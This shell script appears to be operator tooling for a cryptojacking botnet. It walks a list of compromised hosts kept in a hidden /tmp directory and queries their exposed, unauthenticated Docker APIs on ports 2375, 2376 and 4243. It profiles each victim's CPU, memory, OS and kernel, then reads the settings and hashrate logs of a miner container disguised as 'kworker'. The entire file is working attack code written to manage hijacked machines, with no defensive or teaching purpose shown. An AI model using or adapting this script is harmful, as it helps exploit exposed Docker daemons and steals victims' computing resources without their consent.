#!/bin/sh
# What are our victims actually? Profile the hosts we hold a container on:
# daemon version/api, OS/arch/kernel, vCPU count, RAM, port, and what our
# container is set to. Writes lines to $OUT for tallying.
OUT=/tmp/_prof.lines
: > "$OUT"
cd /tmp/.sysd/.hunt || exit 1
for ip in $(cut -f1 dock.owned | sort -u); do
  for p in 2375 2376 4243; do
    case $p in 2376) s=https; o=-k;; *) s=http; o="";; esac
    v=$(curl -fsS $o -m 3 "$s://$ip:$p/version" 2>/dev/null) || continue
    case "$v" in *ApiVersion*) ;; *) continue;; esac
    g() { printf '%s' "$v" | grep -o "\"$1\":\"[^\"]*\"" | head -1 | cut -d'"' -f4; }
    inf=$(curl -fsS $o -m 5 "$s://$ip:$p/info" 2>/dev/null)
    nc=$(printf '%s' "$inf" | grep -o '"NCPU":[0-9]*' | head -1 | cut -d: -f2)
    mt=$(printf '%s' "$inf" | grep -o '"MemTotal":[0-9]*' | head -1 | cut -d: -f2)
    j=$(curl -fsS $o -m 6 "$s://$ip:$p/containers/kworker/json" 2>/dev/null)
    cs=$(printf '%s' "$j" | grep -o '"CpuShares":[0-9]*' | head -1 | cut -d: -f2)
    hz=$(printf '%s' "$j" | grep -c cpu-max-threads-hint)
    sp=$(curl -fsS $o -m 8 "$s://$ip:$p/containers/kworker/logs?stdout=1&stderr=1&tail=200" 2>/dev/null \
         | tr -d '\000' | grep -o 'speed 10s/60s/15m [0-9.]*' | tail -1 | awk '{print $NF}')
    printf '%s port=%s docker=%s api=%s os=%s/%s kernel=%s ncpu=%s mem_mb=%s our_cpu=%s hint=%s speed=%s\n' \
        "$ip" "$p" "$(g Version)" "$(g ApiVersion)" "$(g Os)" "$(g Arch)" "$(g KernelVersion)" \
        "${nc:-?}" "${mt:-?}" "${cs:-?}" "$hz" "${sp:-?}" >> "$OUT"
    break
  done
done
echo "hosts=$(wc -l < "$OUT")"
